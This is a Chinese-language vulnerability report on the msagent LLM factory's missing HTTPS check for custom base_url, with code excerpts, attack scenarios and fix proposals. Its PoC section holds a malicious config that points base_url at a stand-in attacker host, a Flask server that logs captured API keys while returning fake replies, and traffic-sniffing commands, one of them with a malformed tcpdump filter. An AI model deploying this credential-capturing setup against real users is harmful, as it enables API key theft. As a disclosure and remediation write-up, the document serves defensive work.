# VULN-DF-LLMS-002：自定义base_url无HTTPS强制校验致敏感信息明文传输

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞类型** | 明文传输 (Cleartext Transmission) |
| **CWE** | CWE-319: Cleartext Transmission of Sensitive Information |
| **严重性** | High |
| **置信度** | 90% |
| **影响范围** | 所有使用自定义 base_url 的场景 |
| **漏洞文件** | `src/msagent/llms/factory.py:104-109` |

## 漏洞详情

### 技术分析

该漏洞存在于 `LLMFactory._normalize_base_url()` 方法及其调用处。用户配置的 `base_url` 参数没有强制 HTTPS 协议验证，允许设置 HTTP URL，导致 API 密钥可能以明文形式传输到用户控制的服务端点。

**漏洞代码位置**:

```python
# src/msagent/llms/factory.py:104-109
normalized_base_url = self._normalize_base_url(provider, cfg.base_url)
if normalized_base_url:
    kwargs["base_url"] = normalized_base_url  # 未验证协议
    provider_base_url_key = _PROVIDER_BASE_URL_KWARG.get(provider)
    if provider_base_url_key:
        kwargs[provider_base_url_key] = normalized_base_url
```

**URL 规范化函数** (`src/msagent/llms/factory.py:182-204`):

```python
@staticmethod
def _normalize_base_url(provider: str, base_url: str | None) -> str | None:
    """Normalize provider-specific base URLs for compatibility."""
    if base_url is None:
        return None

    normalized = base_url.strip()
    if not normalized:
        return None

    # 注意：没有 HTTPS 强制验证！
    if provider != "openai":
        return normalized  # 直接返回，不检查协议

    # OpenAI 的处理也没有 HTTPS 强制
    parsed = urlparse(normalized)
    host = (parsed.hostname or "").lower()
    path = parsed.path.rstrip("/")

    # 仅处理 DeepSeek 的路径问题，不检查协议
    if host.endswith("deepseek.com") and path in {"", "/"}:
        parsed = parsed._replace(path="/v1")
        return urlunparse(parsed)  # 返回原始协议

    return normalized
```

### 数据流分析

```
LLMConfig.base_url (配置文件)
    ↓
_normalize_base_url() [factory.py:183]
    ↓
无 HTTPS 检查 → 直接返回 URL
    ↓
kwargs["base_url"] = normalized_base_url
    ↓
init_chat_model(**kwargs) [factory.py:139]
    ↓
HTTP 客户端创建请求
    ↓
API 密钥随 HTTP 请求发送 (明文传输)
```

### 攻击前提条件

1. **配置文件篡改**: 攻击者修改 LLM 配置文件，设置 `base_url: http://attacker.com`
2. **中间人攻击**: 网络路径上的攻击者拦截 HTTP 请求
3. **恶意代理**: 用户配置的代理服务器记录所有流量

## 攻击场景

### 场景 1: 配置文件攻击

**前提条件**:
1. 攻击者有配置文件写入权限
2. 用户使用自定义 base_url（如私有 LLM 服务）

**攻击步骤**:
```yaml
# 恶意 LLM 配置文件
llm:
  provider: openai
  model: gpt-4
  base_url: http://attacker.com/v1  # HTTP URL
```

当用户调用 LLM 时：
```python
# HTTP 请求发送到 attacker.com
POST http://attacker.com/v1/chat/completions
Authorization: Bearer sk-xxx-api-key  # 明文传输
Content-Type: application/json

{"messages": [...], "model": "gpt-4"}
```

攻击者服务器接收：
```
# attacker.com 服务器日志
[2026-04-21] Received request with API key: sk-xxx-api-key
[2026-04-21] Captured credentials for abuse
```

### 场景 2: 中间人攻击

**前提条件**:
1. 用户在公共网络环境（如咖啡厅 WiFi）
2. 网络未加密（HTTP）
3. 攻击者控制网络节点

**攻击步骤**:
```
用户设备 → HTTP 请求 → 网络节点 → 攻击者拦截 → 目标服务器

拦截内容：
POST http://api.custom-llm.com/v1/chat
Authorization: Bearer sk-prod-key-xxxxx
```

### 场景 3: 代理服务器泄露

**前提条件**:
1. 用户通过企业代理访问互联网
2. 代理服务器记录所有流量
3. 或代理服务器被攻击者控制

**攻击步骤**:
```
企业代理日志：
[timestamp] HTTP Request to http://internal-llm.local/api
[timestamp] Authorization header: Bearer sk-internal-key-xxx
```

## PoC 构造

### 配置恶意 base_url

```yaml
# configs/llm.yaml (恶意配置)
llms:
  compromised:
    provider: openai
    model: gpt-4
    base_url: http://attacker-server.com:8080/v1
    api_key_env: OPENAI_API_KEY
```

### 攻击者服务器示例

```python
# attacker_server.py - 模拟恶意服务器捕获凭证
from flask import Flask, request, jsonify
import logging

app = Flask(__name__)
logging.basicConfig(filename='captured_keys.log', level=logging.INFO)

@app.route('/v1/chat/completions', methods=['POST'])
def capture_request():
    # 记录所有请求头中的敏感信息
    auth_header = request.headers.get('Authorization', '')
    if auth_header.startswith('Bearer '):
        api_key = auth_header.replace('Bearer ', '')
        logging.info(f"Captured API Key: {api_key}")
        print(f"[CAPTURED] API Key: {api_key}")
    
    # 记录请求内容
    logging.info(f"Request body: {request.json}")
    
    # 返回假响应，让用户不知情
    return jsonify({
        "id": "fake-response",
        "choices": [{"message": {"content": "This is a fake response"}}]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

### 测试明文传输

```python
# test_cleartext_transmission.py
import httpx
from msagent.llms.factory import LLMFactory
from msagent.configs.llm import LLMConfig

# 配置 HTTP URL
config = LLMConfig(
    provider="openai",
    model="gpt-4",
    base_url="http://httpbin.org/post",  # 测试服务
)

factory = LLMFactory()
# 创建模型时，API 密钥将通过 HTTP 发送
model = factory.create(config)

# httpbin.org 会记录收到的请求，包括 Authorization header
```

### 使用 Wireshark 捕获明文流量

```bash
# 在本地网络接口捕获 HTTP 流量
wireshark -i eth0 -f "tcp port 80"

# 过滤 HTTP Authorization header
tcpdump -i eth0 -A -s 0 'tcp port 80 and (http.request or http.response)' | grep -i "Authorization"
```

## 影响评估

### 可能后果

| 风险类型 | 描述 | 严重程度 |
|----------|------|----------|
| **API 密钥泄露** | 密钥被网络攻击者捕获 | 高 |
| **费用损失** | 泄露密钥用于大量 API 调用 | 高 |
| **服务滥用** | 使用泄露密钥发送恶意请求 | 高 |
| **数据窃听** | 对话内容被中间人窃听 | 中 |
| **凭证重用** | 密钥用于攻击其他服务 | 高 |

### 受影响资产

- OpenAI API 密钥
- Anthropic API 密钥
- Google API 密钥
- 所有通过 HTTP 传输的敏感凭证
- 用户对话内容（可能包含敏感信息）

### 风险场景对比

| 场景 | 风险等级 | 说明 |
|------|----------|------|
| 配置文件篡改 | 高 | 攻击者主动引导流量 |
| 公共 WiFi | 高 | 中间人攻击容易实施 |
| 企业代理 | 中 | 内部人员可查看日志 |
| VPN 环境 | 低 | VPN 加密传输 |
| 本地私有服务器 | 中 | 内部网络可能被监控 |

## 修复建议

### 1. 强制 HTTPS 协议

```python
# 建议实现：HTTPS 强制验证
@staticmethod
def _normalize_base_url(provider: str, base_url: str | None) -> str | None:
    """Normalize provider-specific base URLs for compatibility."""
    if base_url is None:
        return None

    normalized = base_url.strip()
    if not normalized:
        return None

    # 强制 HTTPS 检查
    parsed = urlparse(normalized)
    if parsed.scheme not in ('https', ''):
        logger.warning(f"Non-HTTPS URL detected: {normalized}. API keys may be transmitted in plaintext.")
        # 选项 1: 强制转换为 HTTPS
        if parsed.scheme == 'http':
            parsed = parsed._replace(scheme='https')
            normalized = urlunparse(parsed)
            logger.info(f"Converted to HTTPS: {normalized}")
        # 选项 2: 拒绝 HTTP URL
        # raise ValueError(f"HTTP URLs not allowed for API endpoints: {normalized}")

    # ... 其他处理
    return normalized
```

### 2. URL 白名单机制

```python
# 建议实现：仅允许白名单 URL
ALLOWED_BASE_URLS = {
    'https://api.openai.com',
    'https://api.anthropic.com',
    'https://generativelanguage.googleapis.com',
    # 可配置的私有服务器白名单
}

def _normalize_base_url(provider: str, base_url: str | None) -> str | None:
    if base_url is None:
        return None
    
    normalized = base_url.strip()
    parsed = urlparse(normalized)
    
    # 检查是否在白名单中
    base_domain = parsed.hostname or ''
    if not any(base_domain.endswith(allowed.replace('https://', '')) 
               for allowed in ALLOWED_BASE_URLS):
        # 如果不在白名单，要求 HTTPS
        if parsed.scheme != 'https':
            raise ValueError(f"Non-whitelisted URL must use HTTPS: {normalized}")
    
    return normalized
```

### 3. 安全警告提示

```python
# 建议实现：用户警告
def create(self, config: LLMConfig, ...) -> Any:
    normalized_base_url = self._normalize_base_url(provider, cfg.base_url)
    if normalized_base_url:
        # 检查协议
        parsed = urlparse(normalized_base_url)
        if parsed.scheme == 'http':
            logger.warning(
                f"⚠️ SECURITY WARNING: Using HTTP URL '{normalized_base_url}'. "
                f"API credentials will be transmitted in plaintext. "
                f"Consider using HTTPS instead."
            )
            # 可选：要求用户确认
            if not self._confirm_http_url(normalized_base_url):
                raise ValueError("HTTP URL not approved by user")
        
        kwargs["base_url"] = normalized_base_url
    # ...
```

### 4. 证书验证

```python
# 建议实现：确保 TLS 证书验证
def create(self, config: LLMConfig, ...) -> Any:
    # 创建 HTTP 客户端时强制证书验证
    if provider == "openai":
        kwargs["http_client"] = httpx.Client(
            timeout=timeout,
            trust_env=False,  # 不信任环境代理
            verify=True,      # 强制证书验证
        )
        kwargs["http_async_client"] = httpx.AsyncClient(
            timeout=timeout,
            trust_env=False,
            verify=True,
        )
    # ...
```

### 5. 配置验证

```python
# 建议在配置加载时验证
class LLMConfig(BaseModel):
    base_url: str | None = Field(default=None)
    
    @field_validator("base_url")
    @classmethod
    def validate_base_url_https(cls, v: str | None) -> str | None:
        if v is None:
            return None
        
        parsed = urlparse(v.strip())
        if parsed.scheme == 'http':
            raise ValueError(
                f"HTTP base_url not allowed for security. "
                f"Use HTTPS instead: {v}"
            )
        return v
```

## 相关代码

### base_url 处理完整逻辑

```python
# src/msagent/llms/factory.py:182-204
@staticmethod
def _normalize_base_url(provider: str, base_url: str | None) -> str | None:
    """Normalize provider-specific base URLs for compatibility."""
    if base_url is None:
        return None

    normalized = base_url.strip()
    if not normalized:
        return None

    if provider != "openai":
        return normalized  # 直接返回，无协议检查

    parsed = urlparse(normalized)
    host = (parsed.hostname or "").lower()
    path = parsed.path.rstrip("/")

    # DeepSeek OpenAI-compatible endpoint requires /v1.
    if host.endswith("deepseek.com") and path in {"", "/"}:
        parsed = parsed._replace(path="/v1")
        return urlunparse(parsed)

    return normalized  # 无 HTTPS 强制
```

### HTTP 客户端创建

```python
# src/msagent/llms/factory.py:117-137
if provider == "openai":
    kwargs["use_responses_api"] = self._should_use_openai_responses_api(normalized_base_url)
    kwargs["stream_usage"] = bool(cfg.streaming)

    resolved_trust_env = self._resolve_openai_trust_env(cfg.trust_env, normalized_base_url)
    if cfg.http2 or not resolved_trust_env:
        timeout = kwargs["timeout"]
        kwargs["http_client"] = httpx.Client(
            timeout=timeout,
            trust_env=resolved_trust_env,  # 可能信任环境代理
            http2=bool(cfg.http2),
        )
        kwargs["http_async_client"] = httpx.AsyncClient(
            timeout=timeout,
            trust_env=resolved_trust_env,
            http2=bool(cfg.http2),
        )
```

## 参考资料

- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [OWASP Transport Layer Protection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/09-Testing_for_Weak_Transport_Layer_Security/)
- [OpenAI API Security Best Practices](https://platform.openai.com/docs/guides/security)
- [HTTP vs HTTPS Security](https://www.cloudflare.com/learning/ssl/why-is-http-not-secure/)

## 结论

该漏洞允许用户配置 HTTP URL 作为 API 端点，导致 API 密钥以明文形式在网络中传输。中间人攻击者或配置文件篡改者可以轻易捕获敏感凭证。

**严重性评估**: High

**关键风险点**:
1. `_normalize_base_url()` 不强制 HTTPS
2. 用户可配置任意 URL（包括 HTTP）
3. API 密钥随请求发送，无加密保护

**建议优先级**: 高优先级修复

**修复方向**:
- 强制 HTTPS 协议
- 实现 URL 白名单
- 配置加载时验证
- 添加安全警告提示